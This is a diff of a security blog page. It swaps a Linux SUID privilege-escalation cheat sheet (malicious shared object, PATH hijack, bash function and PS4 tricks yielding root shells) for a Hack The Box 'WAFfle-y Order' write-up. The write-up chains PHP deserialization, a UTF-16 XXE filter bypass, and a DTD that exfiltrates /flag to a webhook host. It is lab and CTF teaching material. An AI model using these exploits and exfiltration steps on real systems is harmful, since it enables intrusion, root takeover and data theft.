@@ -9,21 +9,21 @@
     <meta name="generator" content="Retype 2.1">
 
     <!-- Primary Meta Tags -->
-    <title>SUID</title>
-    <meta name="title" content="SUID">
-    <meta name="description" content="Search on GTFOBins for exploitation: https://gtfobins.github.io/" />
+    <title>WAFfle-y Order</title>
+    <meta name="title" content="WAFfle-y Order">
+    <meta name="description" content="Category: Web Level: Medium" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://caueb.github.io/linuxprivesc/suid80b3d/">
-    <meta property="og:title" content="SUID">
-    <meta property="og:description" content="Search on GTFOBins for exploitation: https://gtfobins.github.io/">
+    <meta property="og:url" content="https://caueb.github.io/writeups/htb/challenges/waffle-y-order/">
+    <meta property="og:title" content="WAFfle-y Order">
+    <meta property="og:description" content="Category: Web Level: Medium">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://caueb.github.io/linuxprivesc/suid80b3d/">
-    <meta property="twitter:title" content="SUID">
-    <meta property="twitter:description" content="Search on GTFOBins for exploitation: https://gtfobins.github.io/">
+    <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/challenges/waffle-y-order/">
+    <meta property="twitter:title" content="WAFfle-y Order">
+    <meta property="twitter:description" content="Category: Web Level: Medium">
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -169,154 +169,209 @@
                                 <div id="docs-sidebar-right-toggle"></div>
                 
                                 <!-- Page content  -->
-<doc-anchor-target id="suid" class="break-words">
+<doc-anchor-target id="waffle-y-order" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#suid">#</doc-anchor-trigger>
-        <span>SUID</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#waffle-y-order">#</doc-anchor-trigger>
+        <span>WAFfle-y Order</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="find-suid-files">
+<p>Category: Web
+Level: Medium</p>
+<doc-anchor-target id="code-analysis">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#find-suid-files">#</doc-anchor-trigger>
-        <span>Find SUID files</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#code-analysis">#</doc-anchor-trigger>
+        <span>Code Analysis</span>
     </h2>
 </doc-anchor-target>
+<p>Checking out the <code v-pre>index.php</code> we find the <code v-pre>PHPSESSID</code> cookie is serialized:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code></pre>
+<div class="codeblock-title">index.php</div>
+<pre class="language-php"><code v-pre class="language-php">if  ( empty ( $_COOKIE [ 'PHPSESSID' ])) 
+{ 
+    $user  =  new  UserModel; 
+    $user -&gt;username = substr(uniqid( 'guest_' ),  0 ,  10 ); 
+    setcookie( 
+        'PHPSESSID' , 
+        base64_encode(serialize( $user )),  
+        time()+ 60 * 60 * 24 ,  
+        '/' 
+    ); 
+} </code></pre>
 </doc-codeblock></div>
-<ul>
-<li>Search on GTFOBins for exploitation: <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
-<li>Use searchsploit: <code v-pre>searchsploit suidprogram 2.3</code></li>
-</ul>
-<doc-anchor-target id="shared-object">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#shared-object">#</doc-anchor-trigger>
-        <span>Shared Object</span>
-    </h2>
-</doc-anchor-target>
-<p>Use strace to find the shared objects not found.</p>
+<p>In <code v-pre>OrderController.php</code> we find the deserialization:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;
-open(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</code></pre>
+<div class="codeblock-title">OrderController.php</div>
+<pre class="language-php"><code v-pre class="language-php">$body = file_get_contents( 'php://input' );   
+$cookie = base64_decode( $_COOKIE [ 'PHPSESSID' ]);   
+safe_object( $cookie );   
+$user = unserialize( $cookie );</code></pre>
 </doc-codeblock></div>
-<p>In the result above, the program is trying to load a shared object from the user directory.</p>
-<p>1 - Create the directory  /home/user/.config
-2 - cd into .config directory
-3 - create the shared object libcalc.so</p>
+<p>Before the deserialization the cookie is sanitized by <code v-pre>safe_object</code> method. It checks for unsafe functions starting with <code v-pre>__</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">#include 
-#include 
+<div class="codeblock-title">OrderController.php</div>
+<pre class="language-php"><code v-pre class="language-php">function  safe_object ( $serialized_data ) 
+{ 
+    $matches  = []; 
+    $num_matches  = preg_match_all( '/(^|;)O:\d+:&quot;([^&quot;]+)&quot;/' ,  $serialized_data ,  $matches ); 
 
-static void inject() __attribute__((constructor));
- void inject() {
-	setuid(0);
-	system(&quot;/bin/bash -p&quot;); 
-}</code></pre>
+    for  ( $i  =  0 ;  $i  &lt;  $num_matches ;  $i ++) { 
+        $methods  = get_class_methods( $matches [ 2 ][ $i ]); 
+        foreach  ( $methods  as  $method ) { 
+            if  (preg_match( '/^__.*$/' ,  $method ) !=  0 ) { 
+                die ( &quot;Unsafe method: ${method}&quot; ); 
+            } 
+        } 
+    } 
+} </code></pre>
 </doc-codeblock></div>
-<p>Compile:</p>
+<p>Having found the deserialization vulnerability, the next step is to find classes that can be exploited by the deserialization vulnerability.</p>
+<p>There is a <code v-pre>XmlParserModel</code> class and the <code v-pre>__wakeup</code> method, which is called when the object is deserialized:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c</code></pre>
+<div class="codeblock-title">XmlParserModel.php</div>
+<pre class="language-php"><code v-pre class="language-php">class  XmlParserModel 
+{ 
+    private  string  $data ; 
+    private  array  $env ; 
+
+    public  function  __construct ( $data ) 
+    { 
+        $this -&gt;data =  $data ; 
+    } 
+
+    public  function  __wakeup ( ) 
+    { 
+        if  (preg_match_all( &quot;/&lt;!(?:DOCTYPE|ENTITY)(?:\s|%|&amp;#[0-9]+;|&amp;#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'\&quot;]/im&quot; ,  $this -&gt;data)) 
+        { 
+            die ( 'Unsafe XML' ); 
+        } 
+        $env  = @simplexml_load_string( $this -&gt;data,  'SimpleXMLElement' , LIBXML_NOENT); 
+
+        if  (! $env )  
+        { 
+            die ( 'Malformed XML' ); 
+        } 
+
+        foreach  ( $env  as  $key  =&gt;  $value ) 
+        { 
+            $_ENV [ $key ] = ( string ) $value ; 
+        } 
+    } 
+} </code></pre>
 </doc-codeblock></div>
-<p>Execute the SUID file to gain root shell:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">/usr/local/bin/suid-so</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="path-environment-variable">
+<p>In sum, exist a <code v-pre>__wakeup</code> method in <code v-pre>XmlParserModel</code> and object variable <code v-pre>$data</code> with <code v-pre>simplexml_load_string</code> is used as <code v-pre>XML</code> parsing. When deserializing, the vulnerability can give <code v-pre>$data</code> variables arbitrary values that can be created by external entities <code v-pre>XXE</code>.</p>
+<p>However, when <code v-pre>$data</code> is including external entities, it will be replaced by the regular expression <code v-pre>/&lt;!(?:DOCTYPE|ENTITY)(?:\s|%|&amp;#[0-9]+;|&amp;#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'\&quot;]/im</code> matches, resulting in the call <code v-pre>die</code> and return <code v-pre>Unsafe XML</code>.
+For this, you can <code v-pre>UTF-8</code> encoded <code v-pre>XML</code> document converted to <code v-pre>UTF-16</code> coding</p>
+<doc-anchor-target id="methodolgy">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#path-environment-variable">#</doc-anchor-trigger>
-        <span>PATH Environment Variable</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#methodolgy">#</doc-anchor-trigger>
+        <span>METHODOLGY</span>
     </h2>
 </doc-anchor-target>
-<p>We create a reverse shell embedded into a program with the same name as one of the programs used by the SUID programs.</p>
-<p>For example:</p>
-<p><code v-pre>/usr/bin/mysuidprogram</code> is a program that start an apache server using the string <code v-pre>service apache start</code>. We could then create a file named <code v-pre>service</code> located in our user home directory
-and append the <code v-pre>/home/user</code> directory to the PATH variable.</p>
-<p>The computer will call <code v-pre>/home/user/service</code> before <code v-pre>/usr/bin</code> and spawn a root reverse
-shell.</p>
-<doc-anchor-target id="finding-vulnerable-programs-in-suid">
+<p>When making the call, the server checks if the cookie is “safe” with <code v-pre>safe_object()</code>. The method finds all matches of serialized objects and gets their respective class methods. If any of the class method contains <code v-pre>__</code> at the beginning (for magic methods exploits), the program dies.</p>
+<p>Decoded cookie, the ErrorException contains magic method __construct:
+O:14:&quot;ErrorException&quot;:1:{s:8:&quot;username&quot;;s:10:&quot;guest_614c&quot;;}</p>
+<p>To bypass this restriction, I studied this writeup:
+<a href="https://github.com/MegadodoPublications/exploits/blob/master/composr.md#the-moderately-cool-way-that-works">https://github.com/MegadodoPublications/exploits/blob/master/composr.md#the-moderately-cool-way-that-works</a></p>
+<p>Objects that implement the Serializable interface contain two methods serialize and unserialize.
+When serializing such an object a string of the following format will be returned:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">C:&lt;number of characters in the class name&gt;:&quot;&lt;class name&gt;&quot;:&lt;length of the output of the serialize method&gt;:{&lt;output of the serialize method&gt;}.</code></pre>
+</doc-codeblock></div>
+<p>Creating a serialized string in this format for an object of a class that doesn’t implement Serializable will work but the deserialized object will not have any class members set. It is thus not very useful for our purposes but it does lead the way to a final working exploit.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">C:19:“SplDoublyLinkedList”:33:{i:0;:O:10:“HelloWorld”:0:{}:i:42;}</code></pre>
+</doc-codeblock></div>
+<p>Notice the <code v-pre>:</code> before <code v-pre>O</code>. This prevents the regex from matching.
+Part of the payload is going to look like this. <code v-pre>$pay</code> is our serialized payload object.</p>
+<doc-anchor-target id="xml-waf-bypass">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#finding-vulnerable-programs-in-suid">#</doc-anchor-trigger>
-        <span>Finding vulnerable programs (in SUID)</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#xml-waf-bypass">#</doc-anchor-trigger>
+        <span>XML WAF bypass</span>
     </h3>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># Find SUID files
-$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null
-/usr/local/bin/suid-env
-
-Look for programs/services called inside these SUIDs
-$ strings /path/to/file
-
-$ strace -v -f -e execve 2&gt;&amp;1 | grep exec
-[pid 14395] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;service apache2 start&quot;],
-
-$ ltrace /usr/local/bin/suid-env 2&gt;&amp;1 | grep service 
-system(&quot;service apache2 start&quot;
-
-Then create a file named &quot;service&quot;.</code></pre>
-</doc-codeblock></div>
-<p>Create the exploit:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">int main() {
-	setuid(0);
-	system(&quot;/bin/bash -p&quot;);
-}</code></pre>
-</doc-codeblock></div>
-<p>Compile:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">gcc -o service service.c</code></pre>
-</doc-codeblock></div>
-<p>Prepend the current directory to the PATH directory:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ PATH=.:$PATH /usr/local/bin/suid-env</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="old-bash">
+<p>We will serialize XmlParserModel class. It has <code v-pre>__wakeup</code> magic method, and calls <code v-pre>simplexml_load_string()</code> which we will exploit.
+With this method, we can do XXE, but have to first bypass the regex check.
+The LIBXML_NOENT option allows us to use XML entities.</p>
+<p>To bypass the regex, I use UTF-16 encoding on the XML payload.
+The <code v-pre>simplexml_load_string()</code> does whats its told to do, and the regex just don’t know what’s going on and lets the payload through.</p>
+<doc-anchor-target id="dtd-oob-exfiltration">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dtd-oob-exfiltration">#</doc-anchor-trigger>
+        <span>DTD OOB exfiltration</span>
+    </h3>
+</doc-anchor-target>
+<p>Free from restraints, we can finally do the XXE with OOB DTD (inspiration). The challenge is internet-enabled. I’m going to fetch the DTD from ngrok which I tunnel to my machine where I host the DTD file. The DTD reads the flag file and make a call to my internet webhook, where a GET parameter contains the flag.</p>
+<doc-anchor-target id="exploit">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#old-bash">#</doc-anchor-trigger>
-        <span>Old Bash</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#exploit">#</doc-anchor-trigger>
+        <span>Exploit</span>
     </h2>
 </doc-anchor-target>
-<p>Versions &lt; 4.2-048 are vulnerable to path attack.</p>
+<p>Lets create 3 files.
+In <code v-pre>exploit.py</code> we generate php serialized payload and encode using base64. URL encoding is done inplicitly in requests. Insert payload into cookie and make the API call.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># Verify bash version
-$ bash --version 
+<div class="codeblock-title">exploit.py</div>
+<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/python3
 
-# Find the service called by a SUID file
-$ strings /usr/local/bin/suid-env2
-/usr/sbin/service apache2 start
+import requests
+import subprocess
+import base64
 
-$ strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service
-[pid 16729] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/service apache2 
+result = subprocess.run(['php', 'php_pay.php'], stdout=subprocess.PIPE)
+rs = result.stdout 
+pay = base64.b64encode(rs)
+pay = pay.decode()
 
-Note: This time is using the absolute path.
+c = {'PHPSESSID': pay}
+d = {&quot;table_num&quot;:&quot;1&quot;,&quot;food&quot;:&quot;WAFfles&quot;}
 
-# Exploit
-Create a Bash function with the name “/usr/sbin/service” and export the function: 
-
-$ function /usr/sbin/service { /bin/bash -p; } 
-$ export –f /usr/sbin/service 
-
-# Execute the SUID file for a root shell:
-$ /usr/local/bin/suid-env2</code></pre>
+r = requests.post('http://206.189.124.249:32543/api/order', json=d, cookies=c)
+print(r.content.decode())</code></pre>
 </doc-codeblock></div>
-<p>Versions &lt; 4.4 inherit the PS4 env variable.</p>
+<p>In <code v-pre>php_pay.php</code> we create and xml paylod that will be interpreted by simplexml_load_string(). We tell it to fetch our malicious DTD and execute it. Then we convert the xml into UTF-16BE, serialize it and paste it into our predefined serialized structure.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># Find SUID/SGID files
-$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null
+<div class="codeblock-title">php_pay.php</div>
+<pre class="language-php"><code v-pre class="language-php">&lt;?php
 
-# Find the service called by a SUID file
-$ strings /usr/local/bin/suid-env2
-/usr/sbin/service apache2 start
+class XmlParserModel {
+    public string $data;
 
-$ strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service
-[pid 16729] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/service apache2 
+    public function __construct($data)
+    {
+        $this-&gt;data = $data;
+    }
+}
 
-# Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
-$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
+/* UTF-16 encoding
+ * ngrok to malicious.dtd
+ */
+$xml = '&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://1486-88-212-37-72.ngrok.io/malicious.dtd&quot;&gt; %xxe;]&gt;&lt;env&gt;&lt;debug&gt;1&lt;/debug&gt;&lt;/env&gt;';
 
-# Run the /tmp/rootbash file with the -p command line option to get a root shell:
-$ /tmp/rootbash -p</code></pre>
+// perform utf-16 conversion (big endian)
+$xml = iconv('UTF-8', 'UTF-16BE', $xml);
+
+$pay = serialize(new XmlParserModel($xml));
+
+// 11 is number of chars in {} block apart from variable $pay
+$l = 11 + strlen($pay);
+echo 'C:19:&quot;SplDoublyLinkedList&quot;:' . $l . ':{i:0;:' . $pay . ':i:42;}';</code></pre>
 </doc-codeblock></div>
+<p>In <code v-pre>malicious.dtd</code> we tell the system to get contents of /flag and encode it using base64. We have to use base64 encoding because the file contains a newline at the end, and the xml entity doesn’t like that. We then instruct the system to make and http call to our webhook which contains the flag as a GET parameter.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">dtd malicious.dtd</div>
+<pre class="language-none"><code v-pre class="language-none">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://webhook.site/d1a3d99e-30da-4cb5-8e98-a4922d66f996/?x=%file;'&gt;&quot;&gt;
+%eval;
+%exfiltrate;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="flag">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#flag">#</doc-anchor-trigger>
+        <span>FLAG</span>
+    </h2>
+</doc-anchor-target>
+<p>Now we just need to run <code v-pre>exploit.py</code> and get the flag in the webhook.
+HTB{wh0_l3t_th3_enc0d1ngs_0ut???w00f..wo0f..w0of..WAFfl3s!!}</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -326,20 +381,20 @@ $ /tmp/rootbash -p</code></pre>
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/linuxprivesc/sudo25db8/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/writeups/htb/challenges/find-the-easy-pass/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Sudo</span>
+                                                <span class="block mt-1">Find The Easy Pass</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/linuxprivesc/weakfiles0ec7a/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/writeups/htb/machines/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Weak Files Permissions</span>
+                                                <span class="block mt-1">Machines</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -383,6 +438,6 @@ $ /tmp/rootbash -p</code></pre>
 
     <div id="docs-overlay-target"></div>
 
-    <script>window.__DOCS__ = { "title": "SUID", icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+    <script>window.__DOCS__ = { "title": "WAFfle-y Order", icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
 </body>
 </html>
